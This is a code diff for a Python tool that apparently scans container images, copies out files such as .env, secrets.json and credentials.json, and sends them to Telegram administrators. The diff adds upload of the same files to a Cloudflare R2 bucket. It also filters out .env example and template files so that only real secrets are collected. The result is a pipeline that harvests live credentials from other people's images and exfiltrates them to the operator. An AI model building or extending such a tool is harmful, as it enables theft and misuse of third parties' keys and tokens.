@@ -21,6 +21,11 @@ from urllib import parse, request
 from urllib.error import HTTPError, URLError
 
 try:
+    import boto3
+except ImportError:
+    boto3 = None
+
+try:
     from dotenv import load_dotenv
 except ImportError:
     def load_dotenv() -> bool:
@@ -34,12 +39,17 @@ _IMAGE_USAGE_COUNTS: dict[str, int] = {}
 _DB_LOCK = threading.Lock()
 SENSITIVE_FILE_NAMES = {
     "config.json",
-    "settings.py",
     "application.yml",
     "application.yaml",
     "config.yaml",
     "secrets.json",
     "credentials.json",
+}
+ENV_EXCLUDED_NAMES = {
+    ".env.example",
+    ".env.sample",
+    ".env.template",
+    ".env.dist",
 }
 
 
@@ -49,6 +59,11 @@ class AppConfig:
     rate_limit_wait_hours: float
     telegram_bot_token: str | None
     telegram_admin_ids: list[str]
+    r2_endpoint_url: str | None = None
+    r2_access_key_id: str | None = None
+    r2_secret_access_key: str | None = None
+    r2_bucket_name: str | None = None
+    r2_bucket_prefix: str = ""
     insecure_network: bool = False
 
 
@@ -88,12 +103,18 @@ def load_config() -> AppConfig:
     telegram_bot_token = parse_env_value("TELEGRAM_BOT_TOKEN", "").strip() or None
     admin_ids_raw = parse_env_value("TELEGRAM_ADMIN_IDS", "")
     telegram_admin_ids = [item.strip() for item in admin_ids_raw.split(",") if item.strip()]
+    r2_bucket_prefix = parse_env_value("R2_BUCKET_PREFIX", "").strip().strip("/")
 
     return AppConfig(
         db_path=db_path,
         rate_limit_wait_hours=rate_limit_wait_hours,
         telegram_bot_token=telegram_bot_token,
         telegram_admin_ids=telegram_admin_ids,
+        r2_endpoint_url=parse_env_value("R2_ENDPOINT_URL", "").strip() or None,
+        r2_access_key_id=parse_env_value("R2_ACCESS_KEY_ID", "").strip() or None,
+        r2_secret_access_key=parse_env_value("R2_SECRET_ACCESS_KEY", "").strip() or None,
+        r2_bucket_name=parse_env_value("R2_BUCKET_NAME", "").strip() or None,
+        r2_bucket_prefix=r2_bucket_prefix,
     )
 
 
@@ -349,10 +370,12 @@ def init_db(config: AppConfig) -> None:
             )
             """
         )
-        columns = {
-            row[1]
-            for row in conn.execute("PRAGMA table_info(processed_images)")
-        }
+        cursor = conn.cursor()
+        try:
+            cursor.execute("PRAGMA table_info(processed_images)")
+            columns = {row[1] for row in cursor.fetchall()}
+        finally:
+            cursor.close()
         if "found_sensitive_files" not in columns:
             conn.execute(
                 "ALTER TABLE processed_images ADD COLUMN found_sensitive_files INTEGER NOT NULL DEFAULT 0"
@@ -422,7 +445,9 @@ def copy_container_filesystem(container_name: str, destination_root: Path) -> tu
 
 def is_sensitive_file(path: Path) -> bool:
     name = path.name.lower()
-    return name.startswith(".env") or name in SENSITIVE_FILE_NAMES
+    if name.startswith(".env"):
+        return name not in ENV_EXCLUDED_NAMES
+    return name in SENSITIVE_FILE_NAMES
 
 
 def find_env_file(directory: Path) -> Path | None:
@@ -596,6 +621,51 @@ def send_telegram_message(config: AppConfig, text: str) -> None:
 
 def chunk_paths(paths: list[Path], chunk_size: int) -> list[list[Path]]:
     return [paths[index:index + chunk_size] for index in range(0, len(paths), chunk_size)]
+
+
+def build_r2_key(config: AppConfig, image: str, name: str = "") -> str:
+    image_prefix = make_safe_image_name(image)
+    parts = [part for part in [config.r2_bucket_prefix, image_prefix, name] if part]
+    return "/".join(parts)
+
+
+def get_r2_client(config: AppConfig):
+    if not (
+        config.r2_endpoint_url
+        and config.r2_access_key_id
+        and config.r2_secret_access_key
+        and config.r2_bucket_name
+    ):
+        return None
+    if boto3 is None:
+        print("Cloudflare R2 upload skipped: boto3 is not installed.", file=sys.stderr)
+        return None
+
+    session = boto3.session.Session()
+    return session.client(
+        "s3",
+        endpoint_url=config.r2_endpoint_url,
+        aws_access_key_id=config.r2_access_key_id,
+        aws_secret_access_key=config.r2_secret_access_key,
+        region_name="auto",
+    )
+
+
+def upload_files_to_r2(config: AppConfig, image: str, saved_files: list[Path]) -> None:
+    if not saved_files:
+        return
+
+    client = get_r2_client(config)
+    if client is None:
+        return
+
+    folder_key = build_r2_key(config, image) + "/"
+    try:
+        client.put_object(Bucket=config.r2_bucket_name, Key=folder_key, Body=b"")
+        for path in saved_files:
+            client.upload_file(str(path), config.r2_bucket_name, build_r2_key(config, image, path.name))
+    except Exception as exc:
+        print(f"Cloudflare R2 upload failed for {image}: {exc}", file=sys.stderr)
 
 
 def send_telegram_file_groups(config: AppConfig, image: str, saved_files: list[Path]) -> None:
@@ -796,6 +866,7 @@ def scan_repository(
                 f"Sensitive files found in {resolved_image}: {', '.join(path.name for path in saved_files)}",
             )
             send_telegram_file_groups(config, resolved_image, saved_files)
+            upload_files_to_r2(config, resolved_image, saved_files)
 
         return ScanResult(
             image=resolved_image,
